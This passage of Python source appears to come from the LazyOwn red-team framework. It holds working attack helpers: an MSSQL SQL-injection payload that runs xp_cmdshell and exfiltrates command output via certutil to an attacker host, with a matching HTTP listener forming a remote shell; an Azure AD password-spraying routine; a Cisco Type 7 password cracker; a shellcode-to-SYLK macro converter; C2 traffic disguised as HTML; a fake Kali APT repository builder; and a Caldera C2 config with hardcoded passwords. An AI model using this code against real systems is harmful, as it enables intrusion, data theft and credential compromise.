    and returns the hash content as a single string, without any newline characters or extra formatting.

    Returns:
    str: The hash content from the selected file as a single string. If no files are found or an invalid
         selection is made, an empty string is returned.
    """
    path = os.getcwd()
    hash_files = glob.glob(f"{path}/sessions/hash*.txt")

    if not hash_files:
        print_error("No hash files found.")
        return ""
    
    print_msg("The following hash files were found:")
    for idx, hash_file in enumerate(hash_files, 1):
        print_msg(f"{idx}. {hash_file}")

    try:
        file_choice = int(input("    [!] Select the hash file to use (enter the number): "))
        selected_file = hash_files[file_choice - 1]
    except (ValueError, IndexError):
        print_error("Invalid selection.")
        return ""
    
    try:
        if dir == True:
            return selected_file
        else:
            with open(selected_file, "r") as file:
                hash_content = file.read().strip()
            return hash_content
    except Exception as e:
        print_error(f"Failed to read the hash file: {str(e)}")
        return ""

def is_digit(the_digit):
    """Check if the given character is a digit.

    Args:
        the_digit (str): The character to check.

    Returns:
        bool: True if the character is a digit, False otherwise.
    """
    return the_digit in '0123456789'

def crack_password(crypttext):
    """Crack a Cisco Type 7 password.

    Args:
        crypttext (str): The encrypted password in Type 7 format.

    Returns:
        str: The cracked plaintext password or an empty string if invalid.
    """
    crypttext = crypttext.upper()
    plaintext = ''
    xlat = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"
    seed, val = 0, 0

    if len(crypttext) % 2 != 0:
        return ""

    seed = (ord(crypttext[0]) - 0x30) * 10 + ord(crypttext[1]) - 0x30

    if seed > 15 or not is_digit(crypttext[0]) or not is_digit(crypttext[1]):
        return ""

    for i in range(2, len(crypttext)):
        val *= 16

        if is_digit(crypttext[i]):
            val += ord(crypttext[i]) - 0x30
        elif 'A' <= crypttext[i] <= 'F':
            val += ord(crypttext[i]) - ord('A') + 0x0A
        else:
            return ""

        if i % 2 != 0:
            plaintext += chr(val ^ ord(xlat[seed]))
            seed = (seed + 1) % len(xlat)
            val = 0

    return plaintext

def get_terminal_size():
    try:
        size = os.get_terminal_size(sys.stdout.fileno())
        return size.lines, size.columns
    except Exception as e:
        print_error(f"Cannot get the size: {e}")
        return None, None    

def halp():
    """
    Display the help panel for the LazyOwn RedTeam Framework.

    This function prints usage instructions, options, and descriptions for 
    running the LazyOwn framework. It provides users with an overview of 
    command-line options that can be used when executing the `./run` command.

    The output includes the current version of the framework and various 
    options available for users, along with a brief description of each option.

    Options include:
        - `--help`: Displays the help panel.
        - `-v`: Shows the version of the framework.
        - `-p <payloadN.json>`: Executes the framework with a specified payload 
          JSON file. This option is particularly useful for Red Teams.
        - `-c <command>`: Executes a specific command using LazyOwn, for 
          example, `ping`.
        - `--no-banner`: Runs the framework without displaying the banner.
        - `-s`: Runs the framework with root privileges.
        - `--old-banner`: Displays the old banner.

    Example:
        To see the help panel, call the function as follows:
        
        >>> halp()

    Note:
        - This function exits the program after displaying the help information,
          using `sys.exit(0)`.
    """
    print(f"    {RED}[;,;]{GREEN} LazyOwn {CYAN}{version}{RESET}")
    print(f"    {GREEN}Usage: {WHITE}./run {GREEN}[Options]{RESET}")
    print(f"    {YELLOW}Options:")
    print(f"    {GREEN}  --help             Show this help panel.")
    print(f"    {GREEN}  -v                 Show version.")
    print(f"    {GREEN}  -p <payloadN.json> Exec with different payload.json example. ./run -p payload1.json, (Special for RedTeams)")
    print(f"    {GREEN}  -c <command>       Exec a command using LazyOwn example: ping")
    print(f"    {GREEN}  --no-banner        No Banner{RESET}")
    print(f"    {GREEN}  -s                 Run as root {RESET}")
    print(f"    {GREEN}  --old-banner       Show old Banner{RESET}")
    print(f"    {GREEN}  --no-logs          Turn of logs of commands in sessions directory. {RESET}")
    sys.exit(0)
 

def ensure_tmux_session(session_name):
    """
    Ensure that a tmux session is active.

    This function checks whether a specified tmux session is currently running.
    If the session does not exist, it creates a new tmux session with the specified
    name and executes the command to run the LazyOwn RedTeam Framework script.

    The function uses the `tmux has-session` command to check for the existence
    of the session. If the session is not found (i.e., the return code is not zero),
    it will create a new tmux session in detached mode and run the command 
    `./run --no-banner` within that session.

    Args:
        session_name (str): The name of the tmux session to check or create.

    Example:
        To ensure that a tmux session named 'lazyown_sessions' is active,
        call the function as follows:
        
        >>> ensure_tmux_session('lazyown_sessions')

    Note:
        - Ensure that tmux is installed and properly configured on the system.
        - The command executed within the tmux session must be valid and
          accessible in the current environment.
    """
    result = subprocess.run(
        ["tmux", "has-session", "-t", session_name],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    if result.returncode != 0:
        command = f"tmux has-session -t '{session_name}' 2>/dev/null || tmux new-session -d -s '{session_name}' './run --no-banner' && tmux attach -t '{session_name}'"
        print_msg(command)
        os.system(command)

def get_xml(directory):
    """
    Retrieves a list of XML files from the specified directory.

    Args:
        directory (str): The directory to search for XML files.

    Returns:
        list: A list of XML filenames found in the specified directory.
    """
    return [file for file in os.listdir(directory) if file.endswith(".xml")]

def get_domain_from_xml(xml_file):
    """
    Extrae el primer dominio o dirección IP de un archivo XML de un escaneo Nmap.
    """
    domain = None

    if not os.path.exists(xml_file):
        print(f"[!] The XML file '{xml_file}' does not exist.")
        return None

    with open(xml_file, 'r') as file:
        xml_content = file.read()

    ip_match = re.search(r'<address addr="([\d\.]+)"', xml_content)

    domain_match = re.search(r'<hostname name="([\w\.-]+)"', xml_content)

    if domain_match:
        domain = domain_match.group(1)
    elif ip_match:
        domain = ip_match.group(1)

    if domain:
        print(f"[+] Domain/IP found in XML: {domain} [👽]")
    else:
        print("[!] No domain or IP found in the XML file. [👽]")

    return domain

def shellcode_to_sylk(shellcode_path):
    
	sylk_output = SYLK_TEMPLATE

	charinline = 0
	cell = 1

	with open(shellcode_path, "rb") as f:
		byte = f.read(1)
		while byte != b"":
			if charinline == 0:
				sylk_output += ("C;X2;Y%s;E" % (str(cell)))
				cell += 1
			else:
				sylk_output+=("&")
			sylk_output += ("CHAR(" + str(ord(byte)) + ")")
			byte = f.read(1)
			charinline += 1
			if charinline == 20:
				sylk_output += ("\n")
				charinline = 0
	sylk_output+=("\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell)))
	return sylk_output


def get_banner(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(2)
        try:
            s.connect((ip, int(port)))
            s.sendall(b'\n')
            banner = s.recv(1024)
            return banner.decode().strip()
        
        except socket.timeout:
            return "No banner received (timed out)"
        except ConnectionResetError:
            return "Connection reset by peer - no banner available"
        except Exception as e:
            return f"Error: {str(e)}"

def list_binaries(directory='sessions'):
    """
    List all executable binaries in the specified directory.

    Parameters:
    directory (str): The directory to search for binaries. Defaults to 'sessions'.

    Returns:
    list: A list of paths to executable binaries.
    """
    binaries = []
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if os.access(file_path, os.X_OK):
                binaries.append(file_path)

    return binaries

def select_binary(binaries):
    """
    Prompt the user to select a binary from a list.

    Parameters:
    binaries (list): A list of binary paths.

    Returns:
    str: The path of the selected binary.
    """    
    print_msg("Available binaries:")
    for idx, binary in enumerate(binaries):
        print_msg(f"{idx + 1}. {binary}")

    while True:
        try:
            choice = int(input("    [!] Enter the number of the binary to select: ")) - 1
            if 0 <= choice < len(binaries):
                return binaries[choice]
            else:
                print_warn("Invalid choice, please select a valid number.")
        except ValueError:
            print_error("Please enter a number.")

def decode(data):
    """
    Decodes base64 data received from the server output.

    Parameters:
    data (str): Encoded base64 data from the server.

    Returns:
    str: Decoded string output, or an error message if decoding fails.
    """
    parser = HTMLParser()
    try:
        decoded_data = base64.b64decode(data)
    except:
        return '[-] Decoding error'
    return decoded_data.decode('utf-8', errors='ignore')

def get_command(url, lhost):
    """
    Reads a command from standard input and initiates a thread to send the command to the target server.
    """
    try:
        cmd = input('    :\> ')
        threading.Thread(target=send_command, args=(cmd,url,lhost)).start()
    except:
        sys.exit(0)

def send_command(cmd, url, lhost):
    """
    Constructs and sends an SQL payload with xp_cmdshell and certutil for command execution and exfiltration.

    Parameters:
    cmd (str): Command to be executed on the remote MSSQL server.
    """
    print_msg(f"Debug: {url} {lhost} {cmd}")
    payload = "2;"
    payload += "declare @r varchar(6120),@cmdOutput varchar(6120);"
    payload += "declare @res TABLE(line varchar(max));"
    payload += "insert into @res exec Xp_cmdshell %s;"
    payload += "set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path('')), 1, 1, '')) as varbinary(max)) FOR XML PATH(''), BINARY BASE64);"
    payload += f"set @r=concat('certutil -urlcache -f http://{lhost}/',@cmdOutput);"
    payload += "exec Xp_cmdshell @r;"
    payload += "--"

    login = {
        'B1': 'LogIn',
        'logintype': payload % cmd,
        'username': "admin",
        'rememberme': 'ON',
        'password': "admin",
    }

    requests.post(url, data=login)

def activate_server(httpd, url, lhost):
    """
    Activates the HTTP server and fetches the first command from the user.

    Parameters:
    httpd (HTTPServer): The server instance to activate.
    """
    get_command(url, lhost)
    httpd.server_activate()

def Spray(domain, users, password, target_url, wait, verbose, more_verbose):

	results = []

	AD_codes = detailed_codes.keys()

	if verbose or more_verbose:
		print("Targeting: " + target_url + "\n")

	headers = {'Content-Type':'text/xml'}

	for user in users:
		if more_verbose:
			print("\ntesting " + user)
		xml_data = xml_body.substitute(username=user, domain=domain, password=password)
		r = requests.post(target_url, data=xml_data)
	
		if more_verbose:
			print("Status: " + str(r.status_code))

		if 'ThrottleStatus' in r.headers.keys():
			print("Throttling detected => ThrottleStatus: " + r.headers('ThrottleStatus'))

		if 'IfExistsResult' in r.content.decode('UTF-8'):
			print(r.content)
			sys.exit()
		
		if r.status_code == 200:
			results.append([user + '@' + domain, 'Success', password])
			if verbose:
				print(user + "@" + domain + "\t\t:: " + password)
			continue

		for code in AD_codes:
			if code in r.content.decode('UTF-8'):
				if code == 'AADSTS50034':
					results.append([user + "@" + domain, code, 'NOUSER'])
				else:
					results.append([user + "@" + domain, code, 'User Exists'])
				if more_verbose:
					print("\n" + user + "@" + domain + "\t\t:: " + detailed_codes[code])
				break
		time.sleep(wait)
		
	return results


def ProcessResults(results, outfile):
	
	for result in results:
		if result[1] == 'Success':
			outfile.write(result[0] + "\t\t:: " + result[1] + "\n")
		else:
			continue
	
	for result in results:
		if result[1] == 'Success':
			continue
		else:
			outfile.write(result[0] + "\t\t-- " + result[1] + " -- " + detailed_codes[result[1]] + "\n")

def generate_index(repo_dir):
    """
    Generates an APT repository structure and index files for proper compatibility.

    Parameters:
    repo_dir (str): Path to the repository directory.

    Returns:
    None
    """
    dists_dir = os.path.join(repo_dir, 'dists/kali-rolling/main/binary-amd64')
    os.makedirs(dists_dir, exist_ok=True)

    pool_dir = os.path.join(repo_dir, 'pool/main')
    os.makedirs(pool_dir, exist_ok=True)

    for package in os.listdir(repo_dir):
        if package.endswith('.deb'):
            shutil.move(os.path.join(repo_dir, package), os.path.join(pool_dir, package))

    subprocess.run(
        f"dpkg-scanpackages {pool_dir} /dev/null > {dists_dir}/Packages",
        shell=True, check=True
    )
    subprocess.run(
        f"gzip -9c {dists_dir}/Packages > {dists_dir}/Packages.gz",
        shell=True, check=True
    )
    subprocess.run(
        f"xz -9c {dists_dir}/Packages > {dists_dir}/Packages.xz",
        shell=True, check=True
    )

    release_file = os.path.join(repo_dir, 'dists/kali-rolling/Release')
    with open(release_file, 'w') as release:
        release.write("Origin: Kali\n")
        release.write("Label: Kali\n")
        release.write("Suite: rolling\n")
        release.write("Codename: kali-rolling\n")
        release.write("Architectures: amd64\n")
        release.write("Components: main\n")
        release.write("Description: Kali Rolling Repository\n")

    index_content = []
    for root, _, files in os.walk(repo_dir):
        for file in files:
            file_path = os.path.relpath(os.path.join(root, file), repo_dir)
            index_content.append(f'<a href="{file_path}">{file}</a><br>')

    with open(os.path.join(repo_dir, 'index.html'), 'w') as index_file:
        index_file.write('<html><body>\n')
        index_file.write('<h1>APT Repository Index</h1>\n')
        index_file.write(''.join(index_content))
        index_file.write('</body></html>\n')



def replace_variables(command, variables):
    """
    Replace variables in a command string with their corresponding values.

    This function takes a command string and a dictionary of variables and their values.
    It replaces each occurrence of a variable in the command string with its corresponding value.

    Args:
        command (str): The command string containing variables to be replaced.
        variables (dict): A dictionary where the keys are the variables to be replaced
                          and the values are the corresponding values to replace them with.

    Returns:
        str: The command string with all variables replaced by their corresponding values.

    Example:
        command = "Hello, \$name! You have \$amount dollars."
        variables = {"\$name": "Alice", "\$amount": 100}
        result = replace_variables(command, variables)
        print(result)  # Output: "Hello, Alice! You have 100 dollars."
    """    
    for var, value in variables.items():
        value = str(value)
        command = command.replace(var, value)
    return command

def create_caldera_config(file_path):
    """
    Creates a Caldera configuration file with the specified content at the given file path.

    Parameters:
    file_path (str): The path where the configuration file will be created.

    Returns:
    None
    """
    config_content = """
ability_refresh: 60
api_key_blue: LAZYOWNBLUEADMIN123
api_key_red: LAZYOWNREDADMIN123
app.contact.dns.domain: mycaldera.caldera
app.contact.dns.socket: 0.0.0.0:8853
app.contact.gist: API_KEY
app.contact.html: /weather
app.contact.http: http://0.0.0.0:8888
app.contact.slack.api_key: SLACK_TOKEN
app.contact.slack.bot_id: SLACK_BOT_ID
app.contact.slack.channel_id: SLACK_CHANNEL_ID
app.contact.tunnel.ssh.host_key_file: REPLACE_WITH_KEY_FILE_PATH
app.contact.tunnel.ssh.host_key_passphrase: REPLACE_WITH_KEY_FILE_PASSPHRASE
app.contact.tunnel.ssh.socket: 0.0.0.0:8022
app.contact.tunnel.ssh.user_name: grisun0
app.contact.tunnel.ssh.user_password: grisgrisgris
app.contact.ftp.host: 0.0.0.0
app.contact.ftp.port: 2222
app.contact.ftp.pword: lazyown
app.contact.ftp.server.dir: ftp_dir
app.contact.ftp.user: lazyown_user
app.contact.tcp: 0.0.0.0:7010
app.contact.udp: 0.0.0.0:7011
app.contact.websocket: 0.0.0.0:7012
app.frontend.api_base_url: http://localhost:8888
objects.planners.default: atomic
crypt_salt: REPLACE_WITH_RANDOM_VALUE
encryption_key: LAZYOWNADMIN123
exfil_dir: /tmp/lazyown
reachable_host_traits:
- remote.host.fqdn
- remote.host.ip
host: 0.0.0.0
plugins:
- access
- atomic
- compass
- debrief
- fieldmanual
- manx
- response
- sandcat
- stockpile
- training
port: 8888
reports_dir: /tmp
auth.login.handler.module: default
requirements:
  go:
    command: go version
    type: installed_program
    version: 1.19
  python:
    attr: version
    module: sys
    type: python_module
    version: 3.12.7
users:
  blue:
    blue: lazyownblueadmin
  red:
    admin: lazyownredteamtheadmin
    red: lazyownredteamadmin
"""

    try:
        with open(file_path, 'w') as file:
            file.write(config_content)
        print_msg(f"Configuration file created successfully at {file_path}")
    except Exception as e:
        print_error(f"Error creating configuration file: {e}")

def extract_banners(xml_file):
    """
    Extract banner information from an XML file.

    This function parses an XML file and extracts banner information for each host and port.
    The banner information includes the hostname, port, protocol, extra details, and service.

    Args:
        xml_file (str): The path to the XML file to be parsed.

    Returns:
        list: A list of dictionaries, where each dictionary contains banner information for a specific host and port.
              Each dictionary has the following keys:
                - hostname (str): The hostname of the host.
                - port (str): The port number.
                - protocol (str): The protocol used (e.g., tcp, udp).
                - banner (str): Extra information about the service.
                - service (str): The name of the service running on the port.

    Example:
        banners = extract_banners('path/to/file.xml')
    """    
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    banners = []
    for host in root.findall('host'):
        
        hostname = host.find('address').get('addr')
        
        for port in host.findall('ports/port'):
            
            service = port.find('service')
            if service is not None:
                name = service.get('name')

                extrainfo = service.get('extrainfo')
            
           
                banners.append({
                    'hostname': hostname,
                    'port': port.get('portid'),
                    'protocol': port.get('protocol'),
                    'banner': extrainfo,
                
                    'service': name
                })

    return banners

def generate_xor_key(length):
    """
    Generate key XOR long specifyed

    :param length: Lenght of XOR key
    :return: Key XOR in hex.
    """
    if length <= 0:
        raise ValueError("The lenght must be logg than 0")
    key_bytes = [random.randint(0, 255) for _ in range(length)]
    key_hex = ''.join(f'{byte:02X}' for byte in key_bytes)

    return key_hex

def scrape_news():
    """
    Realiza una solicitud a la página de noticias de Hacker News y extrae los títulos, enlaces y puntuaciones de las noticias.

    Returns:
        tuple: Tres listas conteniendo los títulos, enlaces y puntuaciones de las noticias respectivamente.
    """
    url = "https://news.ycombinator.com/"
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')

    titles = []
    links = []
    scores = []
    
    for item in soup.find_all('tr', class_='athing'):
        title_line = item.find('span', class_='titleline')
        if title_line:
            title = title_line.text
            title_link = title_line.find('a')
            link = title_link['href']
            score = item.find_next_sibling('tr').find('span', class_='score')
            if score:
                score = score.text
            else:
                score = "None"
            titles.append(title)
            links.append(link)
            scores.append(score)
        else:
            print_error("No se encontró un título para el elemento, se omite.")

    return titles, links, scores

def display_news(titles, links, scores):
    """
    Crea un DataFrame de pandas y lo imprime, mostrando los títulos, enlaces y puntuaciones de las noticias.

    Args:
        titles (list): Lista de títulos de las noticias.
        links (list): Lista de enlaces de las noticias.
        scores (list): Lista de puntuaciones de las noticias.
    """
    df = pd.DataFrame({
        'Title': titles,
        'Link': links,
        'Score': scores
    })

    print_msg(df)

def htmlify(data):
    """Wrap C2 comms in html and html2 code to make requests look more legitimate"""
    html = "<html><head><title>http server</title></head>\n"
    html += "<body>\n"
    html += "<b>\n"
    html2 = "</b>\n"
    html2 += "</body>\n"
    html2 += "</html>\n"
    return(html + data + "\n" + html2)

def de_htmlify(data):
    """Cleant wrap C2 comms of html and html2 code to get the command from request"""
    html = "<html><head><title>http server</title></head>\n"
    html += "<body>\n"
    html += "<b>\n"
    html2 = "</b>\n"
    html2 += "</body>\n"
    html2 += "</html>\n"
    data = data.replace(html,'').replace(html2,'')
    return(data)

def is_port_in_use(port, host='127.0.0.1'):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
        except socket.error:
            return True
        return False
    

def return_creds():
    credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
    if not os.path.exists(credentials_path):
        username = input("    [!] Enter the username: ")
        password = input("    [!] Enter the password: ")
    else:
        with open(credentials_path, "r") as f:
            credentials = get_credentials()
            if not credentials:
                return

            return credentials

def query_arin_ip(ip):
    """Queries ARIN whois API for organization information of an IP address.

    Args:
        ip: The IP address to query.

    Returns:
        A dictionary containing IP information or None on failure.
    """
    request = urllib.request.Request(f"https://whois.arin.net/rest/ip/{ip}")
    request.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(request) as response:
            return json.loads(response.read().decode())
    except Exception as e:
        print_error(f"ARIN API failed: {e}")
    return None

def get_org(data):
    """Extracts organization name from ARIN whois response data.

    Args:
        data: The JSON data from the ARIN whois API response.

    Returns:
        The organization name or "null" if not found.
    """
    if data.get("net") and data["net"].get("orgRef"):
        return data["net"]["orgRef"]["@name"]
    elif data.get("net") and data["net"].get("customerRef"):
        return data["net"]["customerRef"]["@name"]
    else:
        return "null"


def load_payload():
    with open('payload.json', 'r') as file:
        config = json.load(file)
    return config

def load_adversary():
    with open('adversary.json', 'r') as file:
        config_list = json.load(file)
    return [Config(config) for config in config_list]

def replace_placeholders(template, replacements):
    """
    Replace placeholders in a template string with values from a dictionary.

    Parameters:
        template (str): The template string containing placeholders.
        replacements (dict): A dictionary where keys are placeholders and values are replacements.

    Returns:
        str: The template string with placeholders replaced.
    """
    for key, value in replacements.items():
        template = template.replace(f"{{{key}}}", str(value))
    return template    
class MyServer(HTTPServer):
    """
    Custom HTTP server to handle incoming connections from certutil.
    """
    pass

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    """
    Custom HTTP request handler to intercept and decode GET requests from certutil.
    """
    def log_request(self, *args, **kwargs):
        return

    def log_message(self, *args, **kwargs):
        return

    def do_GET(self):
        global query_id
        self.send_error(404)

        with open('payload.json', 'r') as file:
            data = json.load(file)
        url = data.get('url', 'URL not found')
        lhost = data.get('lhost', 'LHOST not found')
        if query_id % 2 == 0:
            output = self.path
            if output != '/':
                print(decode(output[1:]))
            get_command(url, lhost)
        query_id += 1


class IP2ASN:
    def __init__(self):
        self.as_name = {}
        self.as_country = {}
        self.recs = []

    def open_file(self, filename):
        """Open and parse the IP-to-ASN file."""
        with open(filename, 'rb') as f:
            self.open_reader(f)

    def open_reader(self, reader):
        """Parse the reader stream, handling both regular and gzipped files."""
        if reader.read(2) == b'\x1f\x8b':
            reader.seek(0)
            with gzip.open(reader, 'rb') as f:
                self._parse_file(f)
        else:
            reader.seek(0)
            self._parse_file(reader)

    def _parse_file(self, reader):
        """Parse the TSV data and load it into memory."""
        for line in reader:
            line = line.decode('utf-8').strip()
            parts = line.split('\t')
            if len(parts) < 5:
                continue
            start_ip, end_ip, asn, country, desc = parts[:5]

            if desc == "Not routed":
                continue

            try:
                asn = int(asn)
            except ValueError:
                continue

            if asn not in self.as_name:
                self.as_name[asn] = desc
                self.as_country[asn] = country

            try:
                start_ip = IPAddress(start_ip)
                end_ip = IPAddress(end_ip)
                self.recs.append((start_ip, end_ip, asn))
            except ValueError:
                continue

        self.recs.sort(key=lambda x: x[0])

    def as_of_ip(self, ip):
        """Return the ASN associated with the given IP address."""
        ip = IPAddress(ip)
        idx = bisect.bisect_left(self.recs, (ip, ip, 0))
        return self._rec_index_has_ip(idx - 1, ip)

    def _rec_index_has_ip(self, idx, ip):
        """Check if the given index contains the IP."""
        if idx < 0 or idx >= len(self.recs):
            return 0
        start_ip, end_ip, asn = self.recs[idx]
        if start_ip <= ip <= end_ip:
            return asn
        return 0

    def as_name(self, asn):
        """Get the AS name by ASN."""
        return self.as_name.get(asn, "Unknown")

    def as_country(self, asn):
        """Get the country by ASN."""
        return self.as_country.get(asn, "Unknown")

class Config:
    def __init__(self, config_dict):
        self.config = config_dict
        for key, value in self.config.items():
            setattr(self, key, value)

    def __getitem__(self, key):
        return getattr(self, key, None)

class VulnerabilityScanner:
    """Escáner de vulnerabilidades que busca y muestra información sobre CVEs.

    Attributes:
        headers (dict): Cabeceras de la solicitud HTTP para simular un navegador.
    """

    def __init__(self):
        """Inicializa el escáner con las cabeceras HTTP predefinidas."""
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }

    def search_cves(self, service):
        """Busca CVEs basados en un servicio específico.

        Args:
            service (str): El servicio para buscar vulnerabilidades relacionadas.

        Returns:
            list: Lista de diccionarios con información sobre cada CVE o mensaje de error.
        """
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={service}"
        response = requests.get(url, headers=self.headers)

        if response.status_code != 200:
            return "No se pudo obtener información de las vulnerabilidades"
        
        data_dict = response.json()
        cves_info = []

        for vulnerability in data_dict['vulnerabilities']:
            cve_id = vulnerability['cve']['id']
            descriptions = vulnerability['cve']['descriptions']
            description = next((desc['value'] for desc in descriptions if desc['lang'] == 'es'), None)
            cves_info.append({'cve_id': cve_id, 'description': description})
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(self.search_cve_details, cves_info)

        return cves_info

    def search_cve_details(self, cve_info):
        """Añade detalles adicionales a la información del CVE.

        Args:
            cve_info (dict): Información básica del CVE incluyendo id y descripción.
        """
        cve_details_url = f"https://www.cvedetails.com/cve/{cve_info['cve_id']}/"
        response = requests.get(cve_details_url, headers=self.headers)

        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            cvss_info = soup.find('div', {'class': 'cvssbox'})
            cve_info['cvss'] = cvss_info.get_text().strip() if cvss_info else 'No disponible'
            cve_info['url'] = cve_details_url

    def pretty_print(self, cves_details):
        """Imprime una tabla bonita con detalles de CVEs.

        Args:
            cves_details (list): Lista de CVEs con toda la información recopilada.
        """
        path = os.getcwd()
   
        file_path = f"{path}/sessions/vuln_report_{int(time.time())}.csv"
        print_msg("Vulnerabilities found.")
        csv = "CVE ID;   Description;   CVSS;  URL"
        print_msg(csv)

        
        cves_details_sorted = sorted(
            cves_details,
            key=lambda x: float(x['cvss']) if x['cvss'] not in ["No disponible", None] else 0.0,
            reverse=False
        )

        for cve in cves_details_sorted:
            cvss_str = str(cve['cvss']) if cve['cvss'] not in ["No disponible", 0.0] else "No disponible"
            content = f"{cve['cve_id']};    {cve['description']};   {cvss_str}; {cve['url']} \n"
            csv += content
            print_msg(content)

        try:
            with open(file_path, 'w') as file:
                file.write(csv)
            print_msg(f"Csv file created successfully at {file_path}")
        except Exception as e:
            print_error(f"Error creating Csv file: {e}")        

class Config:
    def __init__(self, config_dict):
        self.config = config_dict
        for key, value in self.config.items():
            setattr(self, key, value)

    def __getitem__(self, key):
        return getattr(self, key, None)       

signal.signal(signal.SIGINT, signal_handler)
arguments = sys.argv[1:]  

for arg in arguments:
    if arg == "--help":
        halp()

    elif arg == "-v":
        print_msg(f"LazyOwn Framework: {version}")
        sys.exit(0)
    elif arg == "-h":
        halp()
    elif arg == "--no-banner":
        NOBANNER = True

    elif arg == "-s":
        RUN_AS_ROOT = True

    elif arg.startswith("-c"):
        print_msg(f"Exec: option {arg}")
        break
    elif arg.startswith("-p"):
        print_msg(f"Load Payload: option {arg}")
        break
    elif arg.startswith("--old-banner"):
        BANNER = OLD_BANNER
        break
    elif arg.startswith("--no-logs"):
        NOLOGS = True
        break      
    else:
        print_error(f"Error: Wrong argument: {arg}")
       

if RUN_AS_ROOT:
    check_sudo()


if __name__ == "__main__":
    print_error("This script is not for execute apart from LazyOwn Framework")
    